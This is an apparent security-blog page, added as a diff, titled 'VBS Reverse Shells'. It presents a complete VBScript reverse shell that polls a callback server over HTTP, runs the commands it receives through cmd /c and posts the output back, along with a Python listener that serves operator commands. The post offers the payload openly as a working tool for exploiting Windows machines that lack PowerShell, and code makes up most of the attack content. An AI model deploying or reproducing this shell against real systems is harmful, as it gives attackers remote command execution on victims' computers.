@@ -1,0 +1,206 @@
+<!DOCTYPE HTML>
+<html>
+  <head> <meta charset="utf-8"/>
+<meta name="generator" content="Docutils 0.14: http://docutils.sourceforge.net/" />
+<title>Breakpoint</title>
+    <link rel="stylesheet" type="text/css" href="../style/base.css"/>
+    <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
+
+    <link rel="alternate" type="application/rss+xml" title="Breakpoint RSS" href="../rss.xml"/>
+  </head>
+  <body>
+    <header class="site-header">
+      <div class="site-title">
+        <div class="title-text">
+          <h1>Breakpoint</h1>
+          <h2>Stepping through security</h2>
+        </div>
+        <img src="../image/tomoko1.png"/>
+      </div>
+      <div class="wrap">
+        <ul>
+          <li><a href="../index.html">Index</a></li>
+          <li><a href="https://github.com/cym13">Github</a></li>
+          <li><a href="../about.html">About</a></li>
+        </ul>
+      </div>
+    </header>
+
+    <div class="content">
+      <div class="section" id="vbs-reverse-shells">
+<h1>VBS Reverse Shells</h1>
+<div class="section" id="introduction">
+<h2>Introduction</h2>
+<p><strong>tl;dr:</strong> <a class="reference external" href="https://github.com/cym13/vbs-reverse-shell">https://github.com/cym13/vbs-reverse-shell</a></p>
+<p>Reverse shells are scripts that provide shell access to remote users. They
+are omnipresent when it comes to computer hacking as they allow the attacker
+to transform a single often tedious command execution into an interactive
+shell fit for further exploitation.</p>
+<p>Most reverse shells scripts are in Bash, Perl or Python for Linux, or
+Powershell for Windows. One may notice the lack of options when it comes to
+hacking Windows computers: the fact is that if Powershell is available then
+it should be used as it's a very powerful scripting language. But not all
+Windows have Powershell, and in its absence one may wonder what to do.</p>
+<p>We will explore another alternative for Windows systems: Visual Basic Script.</p>
+</div>
+<div class="section" id="the-language">
+<h2>The language</h2>
+<p>VBS is a scripting language inspired by Microsoft's Visual Basic and created
+in 1996. It has been the default Windows scripting language since Windows 98
+and Windows Server NT 4.0 and is still available on Windows 10 today.</p>
+<p>Long story short it's an awful language but it's powerful and resilient. It's
+been used to attack computers for a long time and notably used for the famous
+virus <a class="reference external" href="https://en.wikipedia.org/wiki/ILOVEYOU">ILOVEYOU</a>.</p>
+<img alt="../image/mary_love_letter.png" src="../image/mary_love_letter.png" style="width: 40%;" />
+<p><em>So if it's such a ubiquitous language, why isn't it already used for reverse
+shells by most people?</em></p>
+<p>Well, the main reason is that VBS has no easy way to deal with raw sockets by
+default. Reverse shells are usually about reading commands from a socket,
+executing them, printing their output to the socket and looping over. No raw
+socket API means that this simple strategy isn't so simple anymore.</p>
+<p>What VBS has however is a way to perform web requests, so the strategy we'll
+use is to encapsulate commands and outputs in HTTP requests. This will need a
+specific server but it isn't much of an issue.</p>
+</div>
+<div class="section" id="the-payload">
+<h2>The payload</h2>
+<p>The VBS payload will ask the callback server for commands through GET
+requests, reading it from the response. It will then execute the command and
+POST the output to the server. No response is expected at that point.</p>
+<p>The good thing with that strategy is that it works. I mean, as we said
+earlier, VBS has its limitations so getting a working reverse shell is worth
+mentioning.</p>
+<p>There are also some disadvantages:</p>
+<ul class="simple">
+<li><p>It is stateless, in particular this implementation doesn't allow the user
+to change directory or define variables. Each request is independent from
+the others.</p></li>
+<li><p>It's big. A <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">typical bash reverse shell</a> doesn't take more than 40 chars
+which can easily be concealed or transmitted through narrow buffers. Our
+script is 20 times bigger than that.</p></li>
+<li><p>It cannot be transformed into a full TTY shell easily. This means that
+commands that would interactively ask for user input will fail.</p></li>
+</ul>
+<p>An interesting implementation detail though: by using <em>On Error Resume Next</em>
+we tell the script not to stop on errors. This way, even if we're stalled or
+if the connection with the server is lost the script will just retry again
+and give us the hand back. We're never stuck (although we may have to wait a
+few minutes).</p>
+<p>For this reason we defined an exit flag: <em>EXIT</em>. This allows us to shut the
+script down properly.</p>
+<p>Without further delay, here is the full payload I use:</p>
+<pre class="code vbnet literal-block"><code><span class="kd">Option Explicit
+On</span> <span class="k">Error</span> <span class="k">Resume</span> <span class="k">Next</span>
+
+<span class="k">CONST</span> <span class="n">callbackUrl</span> <span class="o">=</span> <span class="s">&quot;http://localhost:80/&quot;</span>
+
+<span class="k">Dim</span> <span class="n">xmlHttpReq</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="n">execObj</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">break</span><span class="p">,</span> <span class="n">result</span>
+
+<span class="k">Set</span> <span class="n">shell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;WScript.Shell&quot;</span><span class="p">)</span>
+
+<span class="n">break</span> <span class="o">=</span> <span class="k">False</span>
+<span class="k">While</span> <span class="n">break</span> <span class="o">&lt;&gt;</span> <span class="k">True</span>
+    <span class="k">Set</span> <span class="n">xmlHttpReq</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;MSXML2.ServerXMLHTTP&quot;</span><span class="p">)</span>
+    <span class="n">xmlHttpReq</span><span class="p">.</span><span class="n">Open</span> <span class="s">&quot;GET&quot;</span><span class="p">,</span> <span class="n">callbackUrl</span><span class="p">,</span> <span class="k">false</span>
+    <span class="n">xmlHttpReq</span><span class="p">.</span><span class="n">Send</span>
+
+    <span class="n">command</span> <span class="o">=</span> <span class="s">&quot;cmd /c &quot;</span> <span class="o">&amp;</span> <span class="n">Trim</span><span class="p">(</span><span class="n">xmlHttpReq</span><span class="p">.</span><span class="n">responseText</span><span class="p">)</span>
+
+    <span class="k">If</span> <span class="n">InStr</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="s">&quot;EXIT&quot;</span><span class="p">)</span> <span class="k">Then</span>
+        <span class="n">break</span> <span class="o">=</span> <span class="k">True</span>
+    <span class="k">Else</span>
+        <span class="k">Set</span> <span class="n">execObj</span> <span class="o">=</span> <span class="n">shell</span><span class="p">.</span><span class="n">Exec</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+        <span class="n">result</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+        <span class="k">Do</span> <span class="n">Until</span> <span class="n">execObj</span><span class="p">.</span><span class="n">StdOut</span><span class="p">.</span><span class="n">AtEndOfStream</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">&amp;</span> <span class="n">execObj</span><span class="p">.</span><span class="n">StdOut</span><span class="p">.</span><span class="n">ReadAll</span><span class="p">()</span>
+        <span class="k">Loop</span>
+
+        <span class="k">Set</span> <span class="n">xmlHttpReq</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">&quot;MSXML2.ServerXMLHTTP&quot;</span><span class="p">)</span>
+        <span class="n">xmlHttpReq</span><span class="p">.</span><span class="n">Open</span> <span class="s">&quot;POST&quot;</span><span class="p">,</span> <span class="n">callbackUrl</span><span class="p">,</span> <span class="k">false</span>
+        <span class="n">xmlHttpReq</span><span class="p">.</span><span class="n">Send</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+    <span class="k">End</span> <span class="k">If</span>
+<span class="k">Wend</span></code></pre>
+</div>
+<div class="section" id="the-server">
+<h2>The server</h2>
+<p>A special client means a special server. I choose to do it in Python for
+its portability. I decided to use raw sockets and build an HTTP facade on top
+of it. This is because I fear that what we exchange through this tunnel
+will not always be proper HTTP requests and I don't want a real HTTP server
+to helpfully throw exceptions every time it encounters badly formed requests.</p>
+<p>The thing is, we don't need to handle real HTTP requests, just to distinguish
+GET requests from POST ones. And that's exactly what we do:</p>
+<pre class="code python literal-block"><code><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="kn">import</span> <span class="nn">socketserver</span>
+
+<span class="n">PORT</span><span class="o">=</span><span class="mi">80</span>
+
+<span class="k">class</span> <span class="nc">CmdHttpHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">14</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">return</span>
+
+        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">):</span>
+            <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> &gt; &quot;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_address</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">)</span>
+
+            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;HTTP/1.1 200</span><span class="se">\n</span><span class="s2">content-length: &quot;</span>
+                        <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">)</span>
+                        <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span>
+                        <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
+
+            <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+
+        <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">):</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">14</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">()</span>
+
+            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;HTTP/1.1 200</span><span class="se">\n</span><span class="s2">content-length: 0</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+            <span class="k">return</span>
+
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;UTF-8&quot;</span><span class="p">))</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;HTTP/1.1 300</span><span class="se">\n</span><span class="s2">content-length: 0</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;To close connection enter 'EXIT'&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;The computer may be stalled by some commands, just try again&quot;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">()</span>
+
+    <span class="k">with</span> <span class="n">socketserver</span><span class="o">.</span><span class="n">TCPServer</span><span class="p">((</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">PORT</span><span class="p">),</span> <span class="n">CmdHttpHandler</span><span class="p">)</span> <span class="k">as</span> <span class="n">server</span><span class="p">:</span>
+        <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span></code></pre>
+</div>
+<div class="section" id="conclusion">
+<h2>Conclusion</h2>
+<p>When I first encountered a case where I needed a non-Powershell Windows
+reverse shell I was frustrated not to find any. Hopefully nobody will be in
+this situation anymore.</p>
+<p>The VBS code may be minimized to better fit in a tight exploit, but I don't
+think it will account for much. I'm guessing something like 700 bytes is the
+limit. I would be very glad if you were to prove me wrong though!</p>
+<img alt="../image/aihara_enju.png" src="../image/aihara_enju.png" style="width: 60%;" />
+<div class="section" id="image-sources">
+<h3>Image sources</h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://fluffyqueenz.deviantart.com/art/OC-Will-you-accept-my-love-letter-senpai-678491065">https://fluffyqueenz.deviantart.com/art/OC-Will-you-accept-my-love-letter-senpai-678491065</a></p></li>
+<li><p><a class="reference external" href="https://www.quora.com/Whats-the-best-loli-anime">https://www.quora.com/Whats-the-best-loli-anime</a></p></li>
+</ul>
+</div>
+</div>
+</div>
+    </div>
+  </body>
+</html>
